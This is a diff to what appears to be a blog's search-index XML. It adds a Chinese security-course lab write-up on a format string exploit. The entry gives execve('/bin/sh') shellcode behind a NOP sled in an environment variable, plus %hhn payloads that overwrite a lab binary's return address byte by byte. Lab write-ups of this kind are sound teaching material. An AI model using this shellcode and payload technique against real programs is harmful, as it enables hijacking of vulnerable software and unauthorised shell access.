@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>安全攻防综合实验7</title>
+    <link href="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/"/>
+    <url>/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/</url>
+    
+    <content type="html"><![CDATA[<h3 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h3><p><strong>设置环境变量</strong></p><pre><code class="hljs perl">perl -e <span class="hljs-string">'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";'</span> &gt; shellcode1.binexport SHELLCODE=<span class="hljs-string">`perl -e 'print "\x90"x100;'`</span><span class="hljs-string">`cat shellcode1.bin`</span></code></pre><p><strong>查看环境变量存储位置</strong></p><p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/2.png" srcset="/img/loading.gif" alt="2"></p><p>之后编译并且运行<code>get_env</code>，查看环境变量所在位置</p><p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/1.png" srcset="/img/loading.gif" alt="1"></p><p>利用格式化字符 <code>%hhn</code> 逐字节修改返回地址为 <code>0xffffd7a4</code> 。</p><pre><code class="hljs c">./fmt_str `<span class="hljs-built_in">printf</span> <span class="hljs-string">"\x10\x34\xff\xff\x11\x34\xff\xff\x12\x34\xff\xff\x13\x34\xff\xff"</span>`%<span class="hljs-number">3</span>\$<span class="hljs-number">148</span>x%<span class="hljs-number">4</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">51</span>x%<span class="hljs-number">5</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">40</span>x%<span class="hljs-number">6</span>\$hhn%<span class="hljs-number">7</span>\$hhn</code></pre><p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/3.png" srcset="/img/loading.gif" alt="3"></p><p>可以得到 text 的地址为 <code>0xffffd130</code> ，因此返回地址所在的地址为 <code>0xffffd130</code> + <code>0x40c</code> = <code>0xffffd53c</code></p><p>之后构造<code>payload</code></p><pre><code class="hljs c">./fmt_str `<span class="hljs-built_in">printf</span> <span class="hljs-string">"\x3c\xd5\xff\xff\x3d\xd5\xff\xff\x3e\xd5\xff\xff\x3f\xd5\xff\xff"</span>`%<span class="hljs-number">3</span>\$<span class="hljs-number">148</span>x%<span class="hljs-number">4</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">51</span>x%<span class="hljs-number">5</span>\$hhn%<span class="hljs-number">3</span>\$<span class="hljs-number">40</span>x%<span class="hljs-number">6</span>\$hhn%<span class="hljs-number">7</span>\$hhn</code></pre><p><img src="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/4.png" srcset="/img/loading.gif" alt="4"></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>安全攻防综合实验</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>安全攻防综合实验六</title>
     <link href="/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/"/>
     <url>/2021/10/26/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C%E5%85%AD/</url>
